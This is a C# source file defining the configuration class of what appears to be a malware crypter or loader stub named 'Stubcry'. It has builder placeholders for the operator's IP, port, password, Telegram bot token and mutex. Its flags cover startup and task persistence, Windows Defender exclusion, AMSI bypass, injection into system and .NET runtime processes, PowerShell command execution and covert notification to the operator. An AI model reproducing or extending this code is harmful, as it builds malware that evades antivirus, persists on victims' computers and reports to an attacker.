using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Stubcry
{

    internal class config
    {
        public static bool istartup = false;
        public static bool ispersist = false;
        public static bool isNet = false;
        public static bool isNative = false;
        public static bool istask = false;
        public static bool isdotnet = false;
        public static bool isexcludewd = false;
        public static bool issleep = false;
        public static string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "$FOLDER");
        public static string FileName = "$FNAME" + ".exe";
        public static string servicename = "$service";
        public static string fullpath = Path.Combine(folder, FileName);
        public static string ePath = Process.GetCurrentProcess().MainModule.FileName;
        public static int taskm = 0;
        public static int sleeptime = int.Parse("$SLEEPTIME");
        public static bool isrunportal32 = false;
        public static bool isrunportal64 = false;
        public static bool isdotnetload = false;
        public static bool ispassamsi = false;
        public static bool ispwcommand = false;
        public static bool issocketnotify = false;
        public static string ip = "$IP";
        public static int port = int.Parse("$PORT");
        public static string serverpass = "$serverpassword";
        public static bool istelegramnotify = false;
        public static string bottoken = "$bottoken";
        public static string chatid = "$chatid";
        public static string nativeipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#NATIVEINJECTPATH");

        public static string dotnetipath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#DOTNETINJECTPATH");
        public static string command = "$command";
        public static string Mutex = "$MUTEX";
    }
}
